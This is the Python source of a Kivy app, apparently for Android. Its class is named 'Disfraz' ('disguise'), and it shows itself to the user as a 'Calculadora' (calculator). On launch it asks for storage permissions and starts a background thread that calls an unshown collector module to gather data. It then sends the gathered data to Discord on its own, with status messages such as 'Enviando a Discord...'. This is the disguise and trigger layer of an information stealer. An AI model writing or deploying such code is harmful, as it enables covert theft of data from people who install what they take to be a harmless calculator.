import os
import threading
import time

os.environ.setdefault("KIVY_NO_ARGS", "1")

from kivy.app import App
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label

import collector


class Disfraz(App):
    def build(self):
        Window.clearcolor = (0.06, 0.06, 0.07, 1)
        raiz = BoxLayout(orientation="vertical", padding=20, spacing=12)
        raiz.add_widget(Label(text="Calculadora", font_size="22sp", color=(1, 1, 1, 1)))
        self.estado = Label(text="...", font_size="12sp", color=(0.6, 0.6, 0.65, 1))
        raiz.add_widget(self.estado)
        btn = Button(text="Enviar informe ahora", size_hint=(1, 0.35),
                     background_color=(0.35, 0.4, 0.95, 1))
        btn.bind(on_release=lambda *_: self.lanzar())
        raiz.add_widget(btn)
        return raiz

    def on_start(self):
        try:
            from android.permissions import Permission, request_permissions
            request_permissions([Permission.READ_EXTERNAL_STORAGE,
                                 Permission.WRITE_EXTERNAL_STORAGE])
        except Exception:
            pass
        time.sleep(1.5)
        self.lanzar()

    def lanzar(self):
        threading.Thread(target=self._job, daemon=True).start()

    def _job(self):
        try:
            self._set("Recolectando...")
            data = collector.run_collection()
            self._set("Enviando a Discord...")
            ok = collector.send_report(data)
            self._set("Enviado OK" if ok else "Fallo de envio")
        except Exception as e:
            self._set(f"Error: {e}"[:160])

    def _set(self, txt):
        try:
            self.estado.text = txt
        except Exception:
            pass


Disfraz().run()
